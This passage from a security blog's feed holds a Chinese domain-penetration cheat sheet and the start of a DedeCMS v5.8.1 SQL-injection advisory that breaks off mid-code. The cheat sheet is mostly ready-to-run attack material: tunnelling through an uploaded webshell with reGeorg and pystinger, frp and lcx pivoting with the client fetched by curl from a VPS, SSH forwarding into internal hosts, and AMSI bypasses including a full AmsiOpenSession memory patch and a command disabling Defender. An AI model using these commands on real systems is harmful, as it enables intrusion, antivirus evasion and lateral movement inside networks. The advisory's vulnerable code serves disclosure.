href="#场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80-443）" class="headerlink" title="场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80, 443）"></a>场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80, 443）</h6><p>思路：由于防火墙仅允许部分特定外网端口可以访问，思路一仍然是反弹shell只不过目标端口改成特定端口即可；思路二则是端口转发，将内网主机的某些服务的端口转发到外网攻击主机上的防火墙允许的特定端口上，再通过连接外网主机上的本地端口来访问内网服务</p><p><strong>方法一：反弹shell可参考场景一中的方法，仅需修改目标端口为防火墙允许的特定端口即可</strong></p><p><strong>方法二：端口转发</strong></p><p><strong>方法三：SSH的动态端口转发配合proxychains来代理所有流量进一步渗透内网</strong></p><p>1.在内网主机上执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -R <span class="number">2222</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">22</span> -p <span class="number">80</span> root@<span class="number">192.168</span><span class="number">.0</span><span class="number">.230</span></span><br><span class="line">(输入外网主机的SSH口令)</span><br></pre></td></tr></table></figure><p>2.在外网主机上执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -D <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span> -p <span class="number">2222</span> avfisher@<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">(输入内网主机的SSH口令)</span><br></pre></td></tr></table></figure><p>3.在外网主机上配置proxychains设置socks4代理</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/proxychains.conf</span><br><span class="line">[ProxyList]</span><br><span class="line">socks4 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><p>4.使用proxychains代理所有流量进入内网</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nc -nv <span class="number">10.0</span><span class="number">.2</span><span class="number">.5</span> <span class="number">3306</span></span><br></pre></td></tr></table></figure><h6 id="场景三：TCP不出网-HTTP代理"><a href="#场景三：TCP不出网-HTTP代理" class="headerlink" title="场景三：TCP不出网-HTTP代理"></a>场景三：TCP不出网-HTTP代理</h6><p><strong>一.reGeorg</strong></p><p>reGeorg原版：<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a><br>reGeorg修改版：<a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><p>假设拿到的Webshell是<a href="http://aaa.com/shell.jsp%EF%BC%8C%E4%BB%A5%E5%8E%9F%E7%89%88reGeorg%E4%B8%BA%E4%BE%8B%E3%80%82">http://aaa.com/shell.jsp，</a>以原版reGeorg为例。</p><p>上传reGeorg中的 tunnel.jsp，假设当前URL为<a href="http://aaa.com/tunnel.jsp">http://aaa.com/tunnel.jsp</a></p><p>在本地PC运行如下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 8080 -h 0.0.0.0 -u http:&#x2F;&#x2F;aaa.com&#x2F;tunnel.jsp</span><br></pre></td></tr></table></figure><p>此时，将在本地PC的8080开启一个Socks端口，使用Proxifier即可进行代理。需要注意的是，由于这个http代理隧道比较脆弱，建议根据每个目标host单独添加规则，最好不要设置成全局代理。</p><p><strong>二.pystinger</strong></p><p>蜂刺-stinger_client</p><p><a href="https://github.com/FunnyWolf/pystinger">pystinger</a></p><p>整体结构：</p><p>1.上传 proxy.jsp到目标Web服务器，上传stinger_server/stinger_server.exe到目标系统。</p><p>2.使用Webshell启动stinger_server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;stinger_server</span><br><span class="line">nohup &#x2F;tmp&#x2F;stinger_server&gt;&#x2F;dev&#x2F;null nohup.out &amp;</span><br><span class="line"></span><br><span class="line">Windows: start D:&#x2F;XXX&#x2F;stinger_server.exe</span><br></pre></td></tr></table></figure><p>3.VPS服务端启动监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;stinger_client -w http:&#x2F;&#x2F;aaa.com&#x2F;proxy.jsp -l 0.0.0.0 -p 60000</span><br></pre></td></tr></table></figure><p>以上操作成功后，VPS会监听60000端口，接下来直接配置好Proxifier就可以访问目标内网了。</p><p>特别注意：这个代理也不是很稳定，有时候会断开(Wrong data)。遇到断开情况后，手动kill stinger_server进程 再启动，最后重启VPS服务端stinger_client即可</p><h6 id="场景四-TCP出网-socks代理"><a href="#场景四-TCP出网-socks代理" class="headerlink" title="场景四    TCP出网-socks代理"></a>场景四    TCP出网-socks代理</h6><p><strong><a href="https://github.com/fatedier/frp">frp</a></strong></p><p>搭建步骤：<br>1.VPS运行服务端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;frps -c frps.ini</span><br></pre></td></tr></table></figure><p>注：建议用Screen将frp挂起到后台，Screen挂起程序参考<a href="https://www.jianshu.com/p/b24f597c0561">用screen 在后台运行程序 - 简书</a></p><p>frps.ini内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 8080</span><br><span class="line">tls_only &#x3D; true</span><br><span class="line">tcp_mux &#x3D; true</span><br><span class="line">privilege_token &#x3D; token123</span><br><span class="line">kcp_bind_port &#x3D; 8080</span><br></pre></td></tr></table></figure><p>2.使用VPS将frpc frpc.ini上传到主机tmp目录，然后运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;frpc-x86</span><br><span class="line">nohup &#x2F;tmp&#x2F;frpc-x86 -c &#x2F;tmpfrpc.ini&gt;&#x2F;dev&#x2F;null nohup.out &amp;</span><br><span class="line"></span><br><span class="line">Windows</span><br><span class="line">frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p>注：有时候用Webshell管理工具会上传失败或上传文件不完整，可以cd到frp目录，在vps使用 <code>python -m SimpleHTTPServer 80</code> 启动一个webserver，然后在客户端使用 <code>curl http://vpsip/frpc</code>下载文件。</p><p>以上操作成功后，VPS控制台会有输出，然后VPS会启动一个10001端口，接下来直接配置好Proxifier就可以访问目标内网了。</p><p>Proxifier使用参考：<a href="https://blog.csdn.net/u013600314/article/details/106276126/">Proxifier Socks5 代理（内网访问、远程办公）</a></p><p>ps：frp会涉及到免杀的问题，这里推荐另一个代理工具，体积更小，可以看作是rust版本的frp </p><p> <a href="https://github.com/editso/fuso">fuso</a></p><h4 id="0x02-Lcx"><a href="#0x02-Lcx" class="headerlink" title="0x02 Lcx"></a>0x02 Lcx</h4><p>内网IP：192.168.183.168<br>公网IP：192.168.183.181</p><h5 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h5><p>内网机器上执行命令：<code>lcx.exe –slave 公网IP 端口 内网IP 端口</code><br>将内网的3389端口转发到公网的6666端口</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave <span class="number">192.168</span><span class="number">.183</span><span class="number">.181</span> <span class="number">6666</span> <span class="number">192.168</span><span class="number">.183</span><span class="number">.168</span> <span class="number">3389</span></span><br><span class="line">lcx.exe -slave <span class="number">192.168</span><span class="number">.183</span><span class="number">.181</span> <span class="number">6666</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3389</span></span><br></pre></td></tr></table></figure><p>公网机器上执行命令：<code>lcx.exe -listen 监听端口 连接端口</code><br>将在6666端口接收到的数据转发到2222端口</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen <span class="number">6666</span> <span class="number">2222</span></span><br></pre></td></tr></table></figure><p>使用命令<code>mstsc /v:127.0.0.1:2222</code>即可连接到内网3389端口</p><h5 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h5><p>如果内网机器防火墙禁止3389出站，可以使用tran命令将3389端口映射到其他端口上<br>内网机器上执行命令：<code>lcx.exe -tran 映射端口 连接IP 连接端口</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -tran <span class="number">66</span> <span class="number">192.168</span><span class="number">.183</span><span class="number">.168</span> <span class="number">3389</span></span><br></pre></td></tr></table></figure><p>因为实验环境是内网所以直接连接66端口即可访问3389端口，公网还需要端口转发</p><h4 id="0x03-SSH隧道"><a href="#0x03-SSH隧道" class="headerlink" title="0x03  SSH隧道"></a>0x03  SSH隧道</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ssh参数详解：</span><br><span class="line">    -C Enable compression 压缩数据传输</span><br><span class="line">    -q Quiet mode. 安静模式</span><br><span class="line">    -T Disable pseudo-tty allocation. 不占用 shell</span><br><span class="line">    -f Requests ssh to go to background just before command execution. 后台运行，并推荐加上 -n 参数</span><br><span class="line">    -N Do not execute a remote command. 不执行远程命令，端口转发就用它</span><br><span class="line">    -L port:host:hostport 将本地机(客户机)的某个端口转发到远端指定机器的指定端口. </span><br><span class="line">    -R port:host:hostport 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口. </span><br><span class="line">    -D port 指定一个本地机器动态的应用程序端口转发. </span><br><span class="line">    -g port 允许远程主机连接到建立的转发的端口，如果不加这个参数，只允许本地主机建立连接</span><br></pre></td></tr></table></figure><h5 id="SSH本地转发"><a href="#SSH本地转发" class="headerlink" title="SSH本地转发"></a>SSH本地转发</h5><p>语法格式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L [local_bind_addr:]local_port:remote:remote_port middle_host</span><br></pre></td></tr></table></figure><p>远程管理服务器上的mysql，mysql不能直接root远程登陆。这时候就可以通过本地转发，通过ssh将服务器的3306端口转发到1234端口。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L <span class="number">2222</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3306</span> root@<span class="number">139.196</span>.xx.xx</span><br></pre></td></tr></table></figure><p>工作原理：在本地指定一个由ssh监听的转发端口2222，将远程主机的3306端口(127.0.0.1:3306)映射到本地的2222端口，当有主机连接本地映射的2222端口时，本地ssh就将此端口的数据包转发给中间主机VPS，然后VPS再与远程主机端口(127.0.0.1:3306)通信。<br>数据流向：Kali -&gt; 2222 -&gt; VPS -&gt; 127.0.0.1:3306</p><h5 id="SSH远程转发"><a href="#SSH远程转发" class="headerlink" title="SSH远程转发"></a>SSH远程转发</h5><p>语法格式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -R [bind_addr:]remote1_port:host:port remote1</span><br></pre></td></tr></table></figure><p>假设kali开了一个80端口的web服务，外网无法访问，使用远程转发，将kali的80端口转发到外网的其他端口，这时候访问外网的端口，就访问到了内网的端口。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R <span class="number">4444</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">80</span> root@<span class="number">192.168</span><span class="number">.183</span><span class="number">.195</span></span><br></pre></td></tr></table></figure><p>此时在192.168.183.195这台主机上访问127.0.0.1:4444端口即可访问到kali的80端口<br>工作原理：kali在请求外网主机的sshd服务，在外网主机上建立一个套接字监听端口(4444)，它是kali的80端口的映射，当有主机连接外网的4444端口时，连接的数据全部转发给kali，再由kali去访问127.0.0.1:80。</p><p>这里要注意一点，远程端口转发是由远程主机上的sshd服务控制的，默认配置情况下，sshd服务只允许本地开启的远程转发端口(4444)绑定在环回地址(127.0.0.1)上，即使显式指定了bind_addr也无法覆盖。也就是这里访问127.0.0.1:4444端口可以访问成功，访问192.168.183.195:4444却不能访问成功。</p><p>要允许本地的远程转发端口绑定在非环回地址上，需要在外网主机的sshd配置文件中启用”GatewayPorts”项，它的默认值为no，这里将它改为yes。然后重新远程转发一下即可用外网地址访问。</p><h5 id="SSH动态转发-正向代理做动态的端口转发"><a href="#SSH动态转发-正向代理做动态的端口转发" class="headerlink" title="SSH动态转发,正向代理做动态的端口转发"></a>SSH动态转发,正向代理做动态的端口转发</h5><p>本地或远程转发端口和目标端口所代表的应用层协议是一对一的关系，不同的服务就要建立不同的端口，工作很是繁琐，而动态转发只需绑定一个本地端口，而目标端口是根据你发起的请求决定的，比如请求为445端口，通过ssh转发的请求也是445端口。</p><p>语法格式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D [bind_addr:]port remote</span><br></pre></td></tr></table></figure><p>这里举一个最简单的列子：翻墙。国内正常情况下上不了Google，我们可以通过将流量转发到国外的vps上这样就可以正常访问了。<br>在本地执行以下命令，并查看建立连接情况</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -Nfg -D <span class="number">3333</span> root@<span class="number">45.77</span>.xx.xx</span><br></pre></td></tr></table></figure><p>连接建立成功，设置浏览器到本地主机的3333端口</p><h5 id="SSH动态转发，正向代理进行单一的端口转发"><a href="#SSH动态转发，正向代理进行单一的端口转发" class="headerlink" title="SSH动态转发，正向代理进行单一的端口转发"></a>SSH动态转发，正向代理进行单一的端口转发</h5><p>利用ssh -L 提供正向代理，将192.168.183.2的80端口映射到45.77.xx.xx的1111端口上</p><p>访问45.77.xx.xx:1111相当于访问192.168.183.2:80 中间需要192.168.183.1的ssh进行正向代理进行利用。</p><p>语法格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 45.77.xx.xx:1111:192.168.183.2:80 root@192.168.183.1</span><br></pre></td></tr></table></figure><p>此时我们访问45.77.xx.xx的1111端口就相当于访问内网不出网机器的192.168.183.2:80</p><h1 id="16-Bypass-AMSI"><a href="#16-Bypass-AMSI" class="headerlink" title="16.Bypass AMSI"></a>16.Bypass AMSI</h1><p><a href="https://0range-x.github.io/2022/01/23/AMSI/">How to Bypass AMSI </a></p><p>管理员权限关闭amsi</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> <span class="variable">$true</span></span><br></pre></td></tr></table></figure><h3 id="一键关闭AMSI"><a href="#一键关闭AMSI" class="headerlink" title="一键关闭AMSI"></a>一键关闭AMSI</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>).GetField(<span class="string">&#x27;amsiInitFailed&#x27;</span>,<span class="string">&#x27;NonPubilc,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure><p>被加黑了，可以混淆过</p><h3 id="powershell降级"><a href="#powershell降级" class="headerlink" title="powershell降级"></a>powershell降级</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -version 2   &#x2F;&#x2F;改变powershell运行版本</span><br></pre></td></tr></table></figure><h3 id="内存补丁"><a href="#内存补丁" class="headerlink" title="内存补丁"></a>内存补丁</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$p=<span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Linq;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public class Program</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr LoadLibrary(string name);</span></span><br><span class="line"><span class="string">[DllImport(&quot;</span>kernel32<span class="string">&quot;)]</span></span><br><span class="line"><span class="string">public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,</span></span><br><span class="line"><span class="string">uint flNewProtect, out uint lpfloldProtect);</span></span><br><span class="line"><span class="string">public static void Bypass()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">String a =</span></span><br><span class="line"><span class="string">&quot;</span>isma<span class="string">&quot;;</span></span><br><span class="line"><span class="string">IntPtr lib = LoadLibrary(String.Join(&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">, a.Reverse().ToArray()) +</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">.dll<span class="string">&quot;);</span></span><br><span class="line"><span class="string">IntPtr addr = GetProcAddress(lib,</span></span><br><span class="line"><span class="string">&quot;</span>AmsiOpenSession<span class="string">&quot;);</span></span><br><span class="line"><span class="string">uint old = 0;</span></span><br><span class="line"><span class="string">byte[] p;</span></span><br><span class="line"><span class="string">p = new byte[6];</span></span><br><span class="line"><span class="string">p[0] = 0xB8;</span></span><br><span class="line"><span class="string">p[1] = 0xFF;</span></span><br><span class="line"><span class="string">p[2] = 0xFF;</span></span><br><span class="line"><span class="string">p[3] = 0xFF;</span></span><br><span class="line"><span class="string">p[4] = 0xFF;</span></span><br><span class="line"><span class="string">p[5] = 0xC3;</span></span><br><span class="line"><span class="string">VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);</span></span><br><span class="line"><span class="string">Marshal.Copy(p, 0, addr, p.Length);</span></span><br><span class="line"><span class="string">VirtualProtect(addr, (UIntPtr)p.Length, old, out old);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;</span>@</span><br><span class="line">Add-Type $p</span><br><span class="line">[Program]::Bypass()</span><br></pre></td></tr></table></figure><p>参考链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;NyDubh3&#x2F;Pentesting-Active-Directory-CN</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;shmilylty&#x2F;Intranet_Penetration_Tips</span><br><span class="line">https:&#x2F;&#x2F;0range-x.github.io&#x2F;2022&#x2F;01&#x2F;26&#x2F;Domain-penetration_one-stop&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">域渗透速查手册</summary>
    
    
    
    <category term="域渗透" scheme="http://nice759.com/Categories/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="域渗透" scheme="http://nice759.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Dedecms background SQL injection vulnerability</title>
    <link href="http://nice759.com/2021/03/26/Dedecmsv5.8%20SQL%20Injection/"/>
    <id>http://nice759.com/2021/03/26/Dedecmsv5.8%20SQL%20Injection/</id>
    <published>2021-03-26T08:49:53.000Z</published>
    <updated>2021-03-26T09:55:36.282Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vulnerability-Profile"><a href="#Vulnerability-Profile" class="headerlink" title="Vulnerability Profile"></a>Vulnerability Profile</h1><p>DedecMS is a PHP website management system developed by ZhiMeng team. It features simplicity, ease of use and high efficiency, and sets up a variety of websites with distinctive features, such as local portals, industry portals, government and enterprise sites, etc.</p><p>On <a href="https://github.com/dedecms/DedeCMS">Dedecms’ official GitHub home page</a>, they updated Dedecms to the <code>v5.8.1.11 beta</code> a week ago.However, in the background file <code>MAKEHTM_FREELIST_ACTION.php</code> for this version, there is a loose parameter filtering situation, which leads to the SQL injection vulnerability.Malicious hackers can use this vulnerability to gain access to sensitive data or host permissions.</p><h1 id="Affected-Area"><a href="#Affected-Area" class="headerlink" title="Affected Area"></a>Affected Area</h1><p><strong>DedeCMS v5.8.1.11 beta</strong>（Lower versions will be serious in subsequent updates）</p><h1 id="Vulnerability-Type"><a href="#Vulnerability-Type" class="headerlink" title="Vulnerability Type"></a>Vulnerability Type</h1><p>SQL Injection</p><h1 id="Recurring-Environment"><a href="#Recurring-Environment" class="headerlink" title="Recurring Environment"></a>Recurring Environment</h1><p><strong>CMS version number：V5.8.1</strong><br><strong>PHP version：7.3.4</strong><br><strong>MYSQL version：5.70</strong></p><h1 id="Code-Analysis"><a href="#Code-Analysis" class="headerlink" title="Code Analysis"></a>Code Analysis</h1><p>Vulnerability code located in <code>dede/makehtml_freelist_action.php</code>,Here is the vulnerability code</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * 生成自由列表操作</span><br><span class="line"> *</span><br><span class="line"> * @version   $Id: makehtml_freelist_action.php 1 9:11 2010年7月19日 $</span><br><span class="line"> * @package   DedeCMS.Administrator</span><br><span class="line"> * @founder   IT柏拉图, https:&#x2F;&#x2F;weibo.com&#x2F;itprato</span><br><span class="line"> * @author    DedeCMS团队</span><br><span class="line"> * @copyright Copyright (c) 2007 - 2021, 上海卓卓网络科技有限公司 (DesDev, Inc.)</span><br><span class="line"> * @license   http:&#x2F;&#x2F;help.dedecms.com&#x2F;usersguide&#x2F;license.html</span><br><span class="line"> * @link      http:&#x2F;&#x2F;www.dedecms.com</span><br><span class="line"> *&#x2F;</span><br><span class="line">require_once dirname(__FILE__) . &quot;&#x2F;config.php&quot;;</span><br><span class="line">CheckPurview(&#39;sys_MakeHtml&#39;);</span><br><span class="line">require_once DEDEINC . &quot;&#x2F;arc.freelist.class.php&quot;;</span><br><span class="line">if (empty($startid)) &#123;</span><br><span class="line">    $startid &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ci &#x3D; &quot; aid &gt;&#x3D; $startid &quot;;</span><br><span class="line">if (!empty($endid) &amp;&amp; $endid &gt;&#x3D; $startid) &#123;</span><br><span class="line">    $ci .&#x3D; &quot; And aid &lt;&#x3D; $endid &quot;;</span><br><span class="line">&#125;</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html; charset&#x3D;&#123;$cfg_soft_lang&#125;&quot;);</span><br><span class="line">$dsql-&gt;SetQuery(&quot;Select aid From #@__freelist where $ci&quot;);</span><br><span class="line">$dsql-&gt;Execute();</span><br><span class="line">while ($row &#x3D; $dsql-&gt;GetArray()) &#123;</span><br><span class="line">    $idArray[] &#x3D; $row[&#39;aid&#39;];</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($pageno)) &#123;</span><br><span class="line">    $pageno &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (empty($idArray)) &#123;</span><br><span class="line">    $idArray &#x3D; &#39;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$totalpage &#x3D; count($idArray);</span><br><span class="line">if (isset($idArray[$pageno])) &#123;</span><br><span class="line">    $lid &#x3D; $idArray[$pageno];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    ShowMsg(&quot;完成所有文件创建！&quot;, &#39;javascript:;&#39;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$lv &#x3D; new FreeList($lid);</span><br><span class="line">$ntotalpage &#x3D; $lv-&gt;TotalPage;</span><br><span class="line">if (empty($mkpage)) &#123;</span><br><span class="line">    $mkpage &#x3D; 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (empty($maxpagesize)) &#123;</span><br><span class="line">    $maxpagesize &#x3D; 50;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;如果栏目的文档太多，分多批次更新</span><br><span class="line">if ($ntotalpage &lt;&#x3D; $maxpagesize) &#123;</span><br><span class="line">    $lv-&gt;MakeHtml();</span><br><span class="line">    $finishType &#x3D; true;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $lv-&gt;MakeHtml($mkpage, $maxpagesize);</span><br><span class="line">    $finishType &#x3D; false;</span><br><span class="line">    $mkpage &#x3D; $mkpage + $maxpagesize;</span><br><span class="line">    if ($mkpage &gt;&#x3D; ($ntotalpage + 1)) &#123;</span><br><span class="line">        $finishType &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$lv-&gt;Close();</span><br><span class="line">$nextpage &#x3D; $pageno + 1;</span><br><span class="line">if ($nextpage &#x3D;&#x3D; $totalpage) &#123;</span><br><span class="line">    ShowMsg(&quot;完成所有文件创建！&quot;, &#39;javascript:;&#39;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ($finishType) &#123;</span><br><span class="line">        $gourl &#x3D; &quot;makehtml_freelist_action.php?maxpagesize&#x3D;$maxpagesize&amp;startid&#x3D;$startid&amp;endid&#x3D;$endid&amp;pageno&#x3D;$nextpage&quot;;</span><br><span class="line">        ShowMsg(&quot;成功创建列表：&quot; . $tid . &quot;，继续进行操作！&quot;, $gourl, 0, 100);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $gourl &#x3D; &quot;makehtml_freelist_action.php?mkpage&#x3D;$mkpage&amp;maxpagesize&#x3D;$maxpagesize&amp;startid&#x3D;$startid&amp;endid&#x3D;$endid&amp;pageno&#x3D;$pageno&quot;;</span><br><span class="line">        ShowMsg(&quot;列表：&quot; . $tid . 